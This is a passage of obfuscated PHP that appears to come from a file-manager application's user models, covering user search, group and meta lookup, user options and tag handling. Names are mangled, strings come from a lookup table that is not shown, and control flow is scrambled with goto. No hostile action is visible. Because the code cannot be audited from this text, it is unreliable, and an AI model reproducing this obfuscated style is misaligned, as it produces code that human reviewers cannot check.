$cÅÑ³¤£–[33]) ? $cÅÑ³¤£–[33] : $cÅÑ³¤£–[2117]; } if (isset($C„Ã‚Ø‘Ô¿[$cÅÑ³¤£–[708]])) { $FÄ‹Øä·î„[$cÅÑ³¤£–[2118]] = $C„Ã‚Ø‘Ô¿[$cÅÑ³¤£–[708]]; } $c¢Îñâ ì¨ = $this->_makeOrder($bĞÀå“¶Ş¸)->field($cÅÑ³¤£–[2119])->where($FÄ‹Øä·î„)->join($f±çô±Äò›)->selectPage(50); goto bŸ†Ó÷ˆ´¸; bŸ†Ó÷ˆ´¸: $this->_listDataApply($c¢Îñâ ì¨[$cÅÑ³¤£–[363]]); return $c¢Îñâ ì¨; goto Fìç¨ƒ§á†; Fìç¨ƒ§á†: } private function _makeOrder($F½ˆ†ÔëÖï = '') { goto b×£àÜ“ÇÎ; eæÀÅù¥í: $F½ˆ†ÔëÖï = $F½ˆ†ÔëÖï . "\x75\163\145\162\56{$dµÄ– Šóğ}\40{$eïŸ´Ë±¡‰}\x2c\40\x75\163\x65\162\x2e\x75\x73\x65\x72\111\x44\40\x61\x73\x63"; return $this->alias($bŒéÏ£¢“ï[1866])->order($F½ˆ†ÔëÖï); goto e‡†ŠÁšä›; b×£àÜ“ÇÎ: $bŒéÏ£¢“ï =& $_SERVER[Æ¼ôºÙï]; $EƒöÀÎ¹ˆ‘ = array($bŒéÏ£¢“ï[1502], $bŒéÏ£¢“ï[28], $bŒéÏ£¢“ï[1647], $bŒéÏ£¢“ï[1619], $bŒéÏ£¢“ï[192]); $bÄ«Ö»£‘ = array($bŒéÏ£¢“ï[419] => $bŒéÏ£¢“ï[420], $bŒéÏ£¢“ï[421] => $bŒéÏ£¢“ï[422]); goto EÀ½ª­„ ¤; EÀ½ª­„ ¤: $dµÄ– Šóğ = Input::get($bŒéÏ£¢“ï[424], $bŒéÏ£¢“ï[7], $bŒéÏ£¢“ï[1494], $EƒöÀÎ¹ˆ‘); $eïŸ´Ë±¡‰ = Input::get($bŒéÏ£¢“ï[425], $bŒéÏ£¢“ï[7], $bŒéÏ£¢“ï[1746], array($bŒéÏ£¢“ï[1746], $bŒéÏ£¢“ï[421])); $eïŸ´Ë±¡‰ = $bÄ«Ö»£‘[$eïŸ´Ë±¡‰]; goto eæÀÅù¥í; e‡†ŠÁšä›: } public function listSearch($FÅë‡’É¬¦) { goto a³ğÀĞåê; dÚÓ‚İ†‡: $this->_filterByGroup($E¼šÕ¦¥¿˜, $B¥—äë ì); return $E¼šÕ¦¥¿˜; goto dÃË„ŞÒõœ; CÅÁ§®Á¾Ú: if (!$FôÔİß°”õ) { $aŠÕ ä¯ÄË = array(); } if (isset($FÅë‡’É¬¦[$FŞ··‚Å [708]])) { $aŠÕ ä¯ÄË[$FŞ··‚Å [708]] = $FÅë‡’É¬¦[$FŞ··‚Å [708]]; } $aŠÕ ä¯ÄË = $this->parseWhereLike($aŠÕ ä¯ÄË); goto dñ¤µùÀæ; a³ğÀĞåê: $FŞ··‚Å  =& $_SERVER[Æ¼ôºÙï]; $FôÔİß°”õ = $FÅë‡’É¬¦[$FŞ··‚Å [1747]]; $B¥—äë ì = isset($FÅë‡’É¬¦[$FŞ··‚Å [1748]]) ? $FÅë‡’É¬¦[$FŞ··‚Å [1748]] : !1; goto fïÙã©‡Ì¤; fïÙã©‡Ì¤: $FôÔİß°”õ = str_replace($FŞ··‚Å [1749], $FŞ··‚Å [1750], trim($FôÔİß°”õ)); $aŠÕ ä¯ÄË = array($FŞ··‚Å [28] => array($FŞ··‚Å [375], "\45{$FôÔİß°”õ}\x25"), $FŞ··‚Å [301] => array($FŞ··‚Å [375], "{$FôÔİß°”õ}\45"), $FŞ··‚Å [1926] => array($FŞ··‚Å [375], "{$FôÔİß°”õ}\x25"), $FŞ··‚Å [936] => $FŞ··‚Å [1751]); if (Input::check($FôÔİß°”õ, $FŞ··‚Å [307])) { $aŠÕ ä¯ÄË[$FŞ··‚Å [1502]] = array($FŞ··‚Å [375], "{$FôÔİß°”õ}\45"); $aŠÕ ä¯ÄË[$FŞ··‚Å [2099]] = array($FŞ··‚Å [375], "{$FôÔİß°”õ}\45"); } goto CÅÁ§®Á¾Ú; dñ¤µùÀæ: $E¼šÕ¦¥¿˜ = $this->_makeOrder()->where($aŠÕ ä¯ÄË)->selectPage(20); if (!$E¼šÕ¦¥¿˜ || count($E¼šÕ¦¥¿˜[$FŞ··‚Å [363]]) < 5 && Input::check($FôÔİß°”õ, $FŞ··‚Å [314])) { $a›µ½ÅÅ½ˆ = $this->_searchFromMeta($FŞ··‚Å [432], $FôÔİß°”õ, 10); $eñÃÂ«Ç¸² = $this->_searchFromMeta($FŞ··‚Å [433], $FôÔİß°”õ, 10); $bÂ–—†È¤ = array_merge($a›µ½ÅÅ½ˆ, $eñÃÂ«Ç¸², $E¼šÕ¦¥¿˜[$FŞ··‚Å [363]]); $E¼šÕ¦¥¿˜[$FŞ··‚Å [363]] = array_unique_by_key($bÂ–—†È¤, $FŞ··‚Å [1502]); $E¼šÕ¦¥¿˜[$FŞ··‚Å [360]][$FŞ··‚Å [361]] = count($E¼šÕ¦¥¿˜[$FŞ··‚Å [363]]); $E¼šÕ¦¥¿˜[$FŞ··‚Å [360]][$FŞ··‚Å [362]] = ceil($E¼šÕ¦¥¿˜[$FŞ··‚Å [360]][$FŞ··‚Å [361]] / $E¼šÕ¦¥¿˜[$FŞ··‚Å [360]][$FŞ··‚Å [358]]); } $this->_listDataApply($E¼šÕ¦¥¿˜[$FŞ··‚Å [363]]); goto dÚÓ‚İ†‡; dÃË„ŞÒõœ: } private function _filterByGroup(&$fğ±ÒóÑé, $DÇÊœ’Ş) { $EÀï¶ÒØŠÙ =& $_SERVER[Æ¼ôºÙï]; if (!$DÇÊœ’Ş) { return $fğ±ÒóÑé; } foreach ($fğ±ÒóÑé[$EÀï¶ÒØŠÙ[363]] as $BµƒÃäˆÆİ => &$EŠÙãÕâ‡˜) { $e“ÎÛèÙšç = array_to_keyvalue($EŠÙãÕâ‡˜[$EÀï¶ÒØŠÙ[1837]], $EÀï¶ÒØŠÙ[33], $EÀï¶ÒØŠÙ[1661]); if (!in_array($DÇÊœ’Ş, $e“ÎÛèÙšç)) { unset($fğ±ÒóÑé[$EÀï¶ÒØŠÙ[363]][$BµƒÃäˆÆİ]); } } unset($EŠÙãÕâ‡˜); $fğ±ÒóÑé[$EÀï¶ÒØŠÙ[363]] = array_values($fğ±ÒóÑé[$EÀï¶ÒØŠÙ[363]]); $fğ±ÒóÑé[$EÀï¶ÒØŠÙ[360]] = array($EÀï¶ÒØŠÙ[1899] => count($fğ±ÒóÑé[$EÀï¶ÒØŠÙ[363]]), $EÀï¶ÒØŠÙ[1897] => $fğ±ÒóÑé[$EÀï¶ÒØŠÙ[360]][$EÀï¶ÒØŠÙ[358]], $EÀï¶ÒØŠÙ[1896] => 1, $EÀï¶ÒØŠÙ[1898] => 1); } private function _searchFromMeta($aÄë™œ¸®, $B³ÌÓˆø, $eéŞ¢ æ­†) { goto Eœªä®î¡ê; eÊãÓòÏñ: $AŠ™³–»¾Ä = array_to_keyvalue($AŠ™³–»¾Ä, $Cñ­˜Ú½”‘[33], $Cñ­˜Ú½”‘[1502]); $eÅ‰°Î³»‚ = $this->where(array($Cñ­˜Ú½”‘[1494] => array($Cñ­˜Ú½”‘[7], $AŠ™³–»¾Ä)))->select(); if (!$eÅ‰°Î³»‚) { return array(); } goto C‚ÇµÈ¶šã; AÜ‡÷Ô´¡¢: $E¿¼›µ³ö± = $this->parseWhereLike($E¿¼›µ³ö±); $AŠ™³–»¾Ä = Model($Cñ­˜Ú½”‘[2120])->where($E¿¼›µ³ö±)->limit($eéŞ¢ æ­†)->select(); if (!$AŠ™³–»¾Ä) { return array(); } goto eÊãÓòÏñ; C‚ÇµÈ¶šã: return $eÅ‰°Î³»‚; goto E¢‡Š³ÁÜ­; Eœªä®î¡ê: $Cñ­˜Ú½”‘ =& $_SERVER[Æ¼ôºÙï]; $B³ÌÓˆø = strtolower($B³ÌÓˆø); $E¿¼›µ³ö± = array($Cñ­˜Ú½”‘[92] => $aÄë™œ¸®, $Cñ­˜Ú½”‘[368] => array($Cñ­˜Ú½”‘[375], "\x25{$B³ÌÓˆø}\45")); goto AÜ‡÷Ô´¡¢; E¢‡Š³ÁÜ­: } private function _listDataApplyItem($cÌÊÂìÎáŠ) { $B•¥òÛî‹¢ = array($cÌÊÂìÎáŠ); $this->_listDataApply($B•¥òÛî‹¢); return $B•¥òÛî‹¢[0]; } private function _listDataApply(&$B¦¾‘êö³£) { goto CİïÌ„øÛ¤; CİïÌ„øÛ¤: $fÅß‡¾í©½ =& $_SERVER[Æ¼ôºÙï]; if (!$B¦¾‘êö³£) { return; } array_remove_key($B¦¾‘êö³£, $fÅß‡¾í©½[828]); goto E…¯¡Æ“‹ï; E…¯¡Æ“‹ï: $eøĞ¦Ş÷¾ä = array_to_keyvalue($B¦¾‘êö³£, $fÅß‡¾í©½[33], $fÅß‡¾í©½[1502]); $this->_listAppendGroup($B¦¾‘êö³£, $eøĞ¦Ş÷¾ä); $this->_listAppendMeta($B¦¾‘êö³£, $eøĞ¦Ş÷¾ä); goto c¢ôÊà»÷Õ; c¢ôÊà»÷Õ: $this->_listAppendSourceRoot($B¦¾‘êö³£, $eøĞ¦Ş÷¾ä); goto eˆÜí¼¹¹‡; eˆÜí¼¹¹‡: } private function _listAppendSourceRoot(&$cš•’«í´, $F‰ŸÁÜÔ‹Ÿ) { goto cÙø°ƒ¿Î; fôÏ¦Ä‡: $a¿Áñ“ÇŒƒ = Model($BÑÌ£ÕŸã°[770])->order($BÑÌ£ÕŸã°[1759])->field($fó®ÖÎ”Å½)->where($bñÁĞ˜…í)->select(); $a¿Áñ“ÇŒƒ = array_to_keyvalue($a¿Áñ“ÇŒƒ, $BÑÌ£ÕŸã°[474]); $a¿Áñ“ÇŒƒ = array_remove_key($a¿Áñ“ÇŒƒ, $BÑÌ£ÕŸã°[474]); goto eÜ¿ó¾ÏÆ ; cÙø°ƒ¿Î: $BÑÌ£ÕŸã° =& $_SERVER[Æ¼ôºÙï]; $bñÁĞ˜…í = array($BÑÌ£ÕŸã°[479] => 0, $BÑÌ£ÕŸã°[389] => SourceModel::TYPE_USER, $BÑÌ£ÕŸã°[474] => array($BÑÌ£ÕŸã°[7], $F‰ŸÁÜÔ‹Ÿ)); $fó®ÖÎ”Å½ = $BÑÌ£ÕŸã°[1758]; goto fôÏ¦Ä‡; eÜ¿ó¾ÏÆ : foreach ($cš•’«í´ as &$E©ê¢£†¬Ï) { $E©ê¢£†¬Ï[$BÑÌ£ÕŸã°[84]] = $a¿Áñ“ÇŒƒ[$E©ê¢£†¬Ï[$BÑÌ£ÕŸã°[1502]]] ? $a¿Áñ“ÇŒƒ[$E©ê¢£†¬Ï[$BÑÌ£ÕŸã°[1502]]] : array(); } unset($E©ê¢£†¬Ï); goto FÚ¦ÄŒöó«; FÚ¦ÄŒöó«: } private function _listAppendGroup(&$aå…ÀÁ·‰, $F¿ãŠÜÁÚÌ) { goto fè¬‰‰½–ñ; fè¬‰‰½–ñ: $câµèÔÓç— =& $_SERVER[Æ¼ôºÙï]; $e¸„ˆƒ»†š = array($câµèÔÓç—[1502] => array($câµèÔÓç—[7], $F¿ãŠÜÁÚÌ)); $c­¶Ö‰Â‰Ã = Model($câµèÔÓç—[1745])->where($e¸„ˆƒ»†š)->select(); goto F‰ØƒÊÒ³; F‰ØƒÊÒ³: $e‚ĞÀÃˆÃ = array_to_keyvalue($c­¶Ö‰Â‰Ã, $câµèÔÓç—[33], $câµèÔÓç—[1661]); $e‚ĞÀÃˆÃ = array_remove_value(array_unique($e‚ĞÀÃˆÃ), $câµèÔÓç—[486]); if (!$e‚ĞÀÃˆÃ || !$c­¶Ö‰Â‰Ã) { return; } goto cÆ„…õ´™; fŠŒ³¬ÎÆá: foreach ($aå…ÀÁ·‰ as &$e§ì½ÈÃ Ş) { $e§ì½ÈÃ Ş[$câµèÔÓç—[1837]] = array(); if (isset($c­¶Ö‰Â‰Ã[$e§ì½ÈÃ Ş[$câµèÔÓç—[1502]]])) { $e§ì½ÈÃ Ş[$câµèÔÓç—[1837]] = $c­¶Ö‰Â‰Ã[$e§ì½ÈÃ Ş[$câµèÔÓç—[1502]]]; } } unset($e§ì½ÈÃ Ş); goto a¢ñ¤ÂìáÚ; DáËœğâèå: $c­¶Ö‰Â‰Ã = array_to_keyvalue_group($c­¶Ö‰Â‰Ã, $câµèÔÓç—[1502]); foreach ($c­¶Ö‰Â‰Ã as &$eº˜éöÂõò) { $BëÎ™‰„‰ = array(); foreach ($eº˜éöÂõò as $C°Û‰ƒ‰¡Ù) { if (!$C°Û‰ƒ‰¡Ù[$câµèÔÓç—[1811]]) { continue; } $fé÷§Ù˜Ù = Model($câµèÔÓç—[1830])->listData($C°Û‰ƒ‰¡Ù[$câµèÔÓç—[1811]]); $BëÎ™‰„‰[] = array($câµèÔÓç—[1661] => $C°Û‰ƒ‰¡Ù[$câµèÔÓç—[1661]], $câµèÔÓç—[2122] => $c¾œÈØÛ±[$C°Û‰ƒ‰¡Ù[$câµèÔÓç—[1661]]][$câµèÔÓç—[28]], $câµèÔÓç—[477] => $c¾œÈØÛ±[$C°Û‰ƒ‰¡Ù[$câµèÔÓç—[1661]]][$câµèÔÓç—[477]], $câµèÔÓç—[394] => $fé÷§Ù˜Ù); } $eº˜éöÂõò = $BëÎ™‰„‰; } unset($eº˜éöÂõò); goto fŠŒ³¬ÎÆá; cÆ„…õ´™: $e¸„ˆƒ»†š = array($câµèÔÓç—[1661] => array($câµèÔÓç—[7], $e‚ĞÀÃˆÃ)); $c¾œÈØÛ± = Model($câµèÔÓç—[1835])->field($câµèÔÓç—[2121])->where($e¸„ˆƒ»†š)->select(); $c¾œÈØÛ± = array_to_keyvalue($c¾œÈØÛ±, $câµèÔÓç—[1661]); goto DáËœğâèå; a¢ñ¤ÂìáÚ: } private function _listAppendMeta(&$D¬ø² ôª†, $C‰†°Æ”·§) { goto eÏ¿¹ŒñŠŒ; BŸì“©˜‘Ñ: $dò–öâŒ­Ó = array($EÙá·ÄñÕ[1502] => array($EÙá·ÄñÕ[7], $C‰†°Æ”·§)); $fÈÛº÷©¸Ï = Model($EÙá·ÄñÕ[2098])->where($dò–öâŒ­Ó)->select(); $fÈÛº÷©¸Ï = array_to_keyvalue_group($fÈÛº÷©¸Ï, $EÙá·ÄñÕ[1502]); goto D‚§Š©†±¼; EÁÜŸ·Ò×«: foreach ($D¬ø² ôª† as &$D”™ÔÍê— ) { $AÁËŸ©ğ” = array(); if (isset($fÈÛº÷©¸Ï[$D”™ÔÍê— [$EÙá·ÄñÕ[1502]]])) { $AÁËŸ©ğ” = $fÈÛº÷©¸Ï[$D”™ÔÍê— [$EÙá·ÄñÕ[1502]]]; } $D”™ÔÍê— [$EÙá·ÄñÕ[2124]] = array(); if (isset($AÁËŸ©ğ”[$dñ‡¢£Â¢])) { $D”™ÔÍê— [$EÙá·ÄñÕ[2124]] = $FöÕ‚Õ®È£->getUserJobInfo($AÁËŸ©ğ”[$dñ‡¢£Â¢]); } } unset($D”™ÔÍê— ); goto eÑ«­ó½Ãã; D‚§Š©†±¼: foreach ($fÈÛº÷©¸Ï as &$EïÅÄ¹­è) { $dÁ½º…ÒòÁ = array(); foreach ($EïÅÄ¹­è as $cÀƒÒ™ßÂõ) { if (!in_array($cÀƒÒ™ßÂõ[$EÙá·ÄñÕ[92]], $eœî®ÆÇ)) { $dÁ½º…ÒòÁ[$cÀƒÒ™ßÂõ[$EÙá·ÄñÕ[92]]] = $cÀƒÒ™ßÂõ[$EÙá·ÄñÕ[368]]; } } $EïÅÄ¹­è = $dÁ½º…ÒòÁ; } unset($EïÅÄ¹­è); $FöÕ‚Õ®È£ = Model($EÙá·ÄñÕ[2123]); goto EÁÜŸ·Ò×«; eÏ¿¹ŒñŠŒ: $EÙá·ÄñÕ =& $_SERVER[Æ¼ôºÙï]; $dñ‡¢£Â¢ = UserJobModel::JOB_KEY; $eœî®ÆÇ = array($EÙá·ÄñÕ[2100]); goto BŸì“©˜‘Ñ; eÑ«­ó½Ãã: } protected function groupUserAll($CÌ†ËÌ‘Œ£) { $fÂĞÖøÀÇ¾ =& $_SERVER[Æ¼ôºÙï]; if (!$CÌ†ËÌ‘Œ£) { return !1; } $B¦»ÌíòÊŠ = Model($fÂĞÖøÀÇ¾[1745])->field($fÂĞÖøÀÇ¾[1502])->where(array($fÂĞÖøÀÇ¾[1661] => array($fÂĞÖøÀÇ¾[7], $CÌ†ËÌ‘Œ£)))->select(); $B¦»ÌíòÊŠ = array_to_keyvalue($B¦»ÌíòÊŠ, $fÂĞÖøÀÇ¾[33], $fÂĞÖøÀÇ¾[1502]); return array_unique($B¦»ÌíòÊŠ); } public function userSearch($AÇŞê°¡Ú, $AŸôµ¸÷‡ä = "\x2a") { return Model($_SERVER[Æ¼ôºÙï][495])->where($AÇŞê°¡Ú)->field($AŸôµ¸÷‡ä)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\x73\x65\162\x5f\157\160\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($d›Ë”õªİí) { $aÒÎƒ˜£¯õ =& $_SERVER[Æ¼ôºÙï]; if (!defined($aÒÎƒ˜£¯õ[443])) { define($aÒÎƒ˜£¯õ[443], 0); } return "\125\163\145\162\x4f\160\x74\x69\157\156\137{$d›Ë”õªİí}\137" . USER_ID; } protected function filterWhere($dí…“µÉ›¯) { $CŒÑŒù­¡ =& $_SERVER[Æ¼ôºÙï]; if (!defined($CŒÑŒù­¡[443])) { define($CŒÑŒù­¡[443], 0); } $dí…“µÉ›¯[$CŒÑŒù­¡[1502]] = USER_ID; return $dí…“µÉ›¯; } public function cacheRemoveUser($B¥Ó½¯É±«, $FÒÓ„ ÆÖ†) { return Cache::remove("\125\163\x65\x72\117\x70\x74\151\x6f\156\137{$B¥Ó½¯É±«}\137" . $FÒÓ„ ÆÖ†); } protected function optionDefault($déÁÒÆ¯Â‘ = '') { $c»£¦†¿ÑÕ =& $_SERVER[Æ¼ôºÙï]; if ($déÁÒÆ¯Â‘ == $c»£¦†¿ÑÕ[33]) { return $GLOBALS[$c»£¦†¿ÑÕ[6]][$c»£¦†¿ÑÕ[2125]]; } if ($déÁÒÆ¯Â‘ == $c»£¦†¿ÑÕ[2126]) { return $GLOBALS[$c»£¦†¿ÑÕ[6]][$c»£¦†¿ÑÕ[2127]]; } } } goto BíÏ½ô·Ú„; fô“Ğ‰«ß: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\146\x61\166"; protected function cacheFunctionAlias($C÷¨÷÷¯é) { $d±ø‘ÜæÊ¦ =& $_SERVER[Æ¼ôºÙï]; return array($d±ø‘ÜæÊ¦[1762] => array(USER_ID, $d±ø‘ÜæÊ¦[1763])); } protected function listData() { $CºÒæ½š¨ô =& $_SERVER[Æ¼ôºÙï]; $cĞİæàó¾ = array($CºÒæ½š¨ô[1494] => USER_ID, $CºÒæ½š¨ô[452] => array($CºÒæ½š¨ô[1766], 0)); $cøÚ¨ˆÖù‡ = $CºÒæ½š¨ô[1768]; $CÓ¥‰éÄö = $this->field($cøÚ¨ˆÖù‡)->where($cĞİæàó¾)->order($CºÒæ½š¨ô[1769])->select(); return $CÓ¥‰éÄö ? $CÓ¥‰éÄö : array(); } protected function listByTag($Eªò‘£…¯) { } protected function addToTag($EëòÀŸ›İ, $A¾¸ßäŠ¡Î) { $Cë¡ååùŒ =& $_SERVER[Æ¼ôºÙï]; if (!Model($Cë¡ååùŒ[1906])->listData($A¾¸ßäŠ¡Î) || !Model($Cë¡ååùŒ[770])->pathInfo($EëòÀŸ›İ)) { return !1; } $Eê‚³åëª­ = array($Cë¡ååùŒ[1494] => USER_ID, $Cë¡ååùŒ[452] => $A¾¸ßäŠ¡Î, $Cë¡ååùŒ[405] => $EëòÀŸ›İ, $Cë¡ååùŒ[406] => $Cë¡ååùŒ[400], $Cë¡ååùŒ[404] => $Cë¡ååùŒ[33], $Cë¡ååùŒ[1665] => 0); if ($this->where($Eê‚³åëª­)->find()) { return !1; } return $this->add($Eê‚³åëª­); } protected function removeFromTag($b‹ÛÂïÍèÄ, $aÊ’àƒæœ) { $dğíøØ´’» =& $_SERVER[Æ¼ôºÙï]; if (!Model($dğíøØ´’»[1906])->listData($aÊ’àƒæœ)) { return !1; } if (is_array($b‹ÛÂïÍèÄ)) { $b‹ÛÂïÍèÄ = array($dğíøØ´’»[7], $b‹ÛÂïÍèÄ); } $a†ãÀáù = array($dğíøØ´’»[1494] => USER_ID, $dğíøØ´’»[452] => $aÊ’àƒæœ, $dğíøØ´’»[406] => $dğíøØ´’»[400], $dğíøØ´’»[405] => $b‹ÛÂïÍèÄ); return $this->where($a†ãÀáù)->delete(); } protected function removeByTag($eŒèÎ»åŞ‹) { $a ‹™ÕÇù™ =& $_SERVER[Æ¼ôºÙï]; if (!$eŒèÎ»åŞ‹) { return !1; } $f±Óµæ—´ğ = array($a ‹™ÕÇù™[1494] => USER_ID, $a ‹™ÕÇù™[452] => $eŒèÎ»åŞ‹); return $this->where($f±Óµæ—´ğ)->delete(); } protected function removeBySource($b±Ö…‘Ç±) { $DÓ»¹‹§ª =& $_SERVER[Æ¼ôºÙï]; if (is_array($b±Ö…‘Ç±)) { $b±Ö…‘Ç± = array($DÓ»¹‹§ª[7], $b±Ö…‘Ç±); } $B‹¾¤Ê‚¦ = array($DÓ»¹‹§ª[1494] => USER_ID, $DÓ»¹‹§ª[405] => $b±Ö…‘Ç±, $DÓ»¹‹§ª[452] => array($DÓ»¹‹§ª[950], 0)); return $this->where($B‹¾¤Ê‚¦)->delete(); } }